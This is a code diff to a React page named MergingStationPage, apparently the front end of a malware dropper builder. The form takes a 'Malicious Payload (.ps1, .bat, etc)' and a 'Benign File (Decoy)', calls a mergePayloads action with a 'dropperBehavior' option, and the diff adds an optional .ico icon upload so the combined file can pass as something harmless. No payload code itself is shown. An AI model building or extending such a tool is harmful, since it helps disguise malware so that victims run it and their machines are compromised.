@@ -9,14 +9,11 @@ import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter }
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
-import { Checkbox } from '@/components/ui/checkbox';
 import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
-import { Textarea } from '@/components/ui/textarea';
 import { useToast } from '@/hooks/use-toast';
-import { Loader2, AlertTriangle, Sparkles, Binary, CheckCircle, File, FileCode, Shield, Download, Clipboard } from 'lucide-react';
+import { Loader2, AlertTriangle, Binary, FileCode, Shield, Download, Clipboard, Image as ImageIcon } from 'lucide-react';
 import { Progress } from '@/components/ui/progress';
-import { Separator } from '@/components/ui/separator';
 import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
 import { Badge } from '@/components/ui/badge';
 import { mergePayloads } from '@/actions/merge-payload-action';
@@ -24,6 +21,7 @@ import { mergePayloads } from '@/actions/merge-payload-action';
 const formSchema = z.object({
   payloadFile: z.any().refine(files => files?.length === 1, "Payload file is required."),
   benignFile: z.any().refine(files => files?.length === 1, "Benign file is required."),
+  iconFile: z.any().optional(),
   outputName: z.string().min(1, "Output name is required."),
   dropperBehavior: z.string(),
 });
@@ -129,8 +127,9 @@ export default function MergingStationPage() {
               <Card>
                 <CardHeader><CardTitle className="text-lg">1. Input Files</CardTitle></CardHeader>
                 <CardContent className="space-y-4">
-                  <FormField control={form.control} name="payloadFile" render={({ field: { onChange, ...fieldProps } }) => (<FormItem><FormLabel>Malicious Payload (.ps1, .bat, etc)</FormLabel><FormControl><Input type="file" onChange={e => onChange(e.target.files)} {...fieldProps} /></FormControl><FormMessage /></FormItem>)} />
-                  <FormField control={form.control} name="benignFile" render={({ field: { onChange, ...fieldProps } }) => (<FormItem><FormLabel>Benign File (Decoy)</FormLabel><FormControl><Input type="file" onChange={e => onChange(e.target.files)} {...fieldProps} /></FormControl><FormMessage /></FormItem>)} />
+                  <FormField control={form.control} name="payloadFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Malicious Payload (.ps1, .bat, etc)</FormLabel><FormControl><Input type="file" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormMessage /></FormItem>)} />
+                  <FormField control={form.control} name="benignFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Benign File (Decoy)</FormLabel><FormControl><Input type="file" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormMessage /></FormItem>)} />
+                  <FormField control={form.control} name="iconFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Icon File (.ico, optional)</FormLabel><FormControl><Input type="file" accept=".ico" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormMessage /></FormItem>)} />
                 </CardContent>
               </Card>
 
